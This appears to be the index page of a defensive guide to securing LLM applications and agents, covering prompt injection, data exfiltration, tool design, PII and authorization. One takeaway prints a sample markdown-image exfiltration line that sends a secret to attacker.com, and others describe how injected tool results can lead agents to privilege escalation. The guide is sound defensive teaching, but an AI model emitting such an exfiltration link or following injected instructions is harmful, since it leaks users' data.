# 08 — AI Security

Securing systems built on models that read untrusted text and sometimes act on it. Plain
language, no jargon for its own sake.

One idea runs through all six files:

> **You cannot make the model trustworthy. You make being tricked not matter.**

Every control in this section is either a *guarantee* (a credential that doesn't exist, an
operation the signature can't express, a counter in your code) or *defense in depth* (a
system prompt, a delimiter, a detector). The skill is knowing which is which — and never
putting a defense-in-depth control in a load-bearing position.

## The files

| File | What it covers |
|---|---|
| [prompt-injection.md](prompt-injection.md) | The defining problem, and why prompting can't solve it |
| [data-exfiltration.md](data-exfiltration.md) | Every channel data leaves by — including the one with no tool |
| [tool-abuse.md](tool-abuse.md) | Designing tools so misuse is bounded |
| [pii.md](pii.md) | Personal data: minimizing, redacting, deleting, residency |
| [authorization.md](authorization.md) | Who can see what and do what — the layer under everything above |
| [agent-security.md](agent-security.md) | The full agent threat model, and designing for compromise |

## Read in this order

Go in file order the first time. `prompt-injection.md` establishes the framing the rest
depend on, and `authorization.md` is where the framing lands.

If you're reviewing a system today, start at
[agent-security.md](agent-security.md#a-review-checklist) — the checklist at the end is the
thing to walk a room through.

If you're building multi-tenant retrieval, go straight to
[authorization.md](authorization.md). The post-filtering bug it describes is the most common
serious mistake in production RAG.

## The short version

**Prompt injection is an authorization problem.** The fix isn't better wording; it's that
the model has no credential that can do the damage. A read-only connection cannot be talked
into a `DELETE`.

**The winning question:** *assume the injection fully succeeds — what's the worst outcome?*
If it's "says something embarrassing," you're fine. If it's "deletes production data," no
amount of prompt hardening helps.

**Data leaves through channels you didn't think of.** The model can exfiltrate with no tools
at all: it writes `![x](https://attacker.com/?d=SECRET)` and the *client* fetches it.

**Filter retrieval inside the query, never after.** Post-filtering loads the other tenant's
data into your process — and silently wrecks result quality, because `k=20` with 18 filtered
out returns 2.

**Tool results are untrusted input**, even from your own systems. A `read_ticket` tool
returns whatever a customer typed.

**Identity is injected; arguments are supplied.** A tool that takes `customer_id` as a
parameter the model fills in is one injection away from horizontal privilege escalation.

**Caps make misbehaviour survivable.** A per-run limit of 1 turns the 312-message incident
into one message. You can't guarantee good behavior; you can guarantee bad behavior is
bounded.

**Design so mistakes fail closed.** A wrong namespace returns nothing. A missing filter on a
shared index returns everyone's data. Prefer the first.

**Embeddings are derived personal data.** Your vector index isn't exempt from deletion,
residency, or access rules.

## Related

- [04-agents/permissions.md](../04-agents/permissions.md) — the mechanics: effect classes,
  caps, approval gates
- [04-agents/mcp.md](../04-agents/mcp.md) — connecting third-party tools, and the trust
  question that comes with it
- [07-production/caching.md](../07-production/caching.md) — the cache-key incident that
  served one customer's answers to another
- [07-production/incident-response.md](../07-production/incident-response.md) — what to do
  when one of these lands
- [12-senior-scenarios/](../12-senior-scenarios/) — these problems as interview scenarios
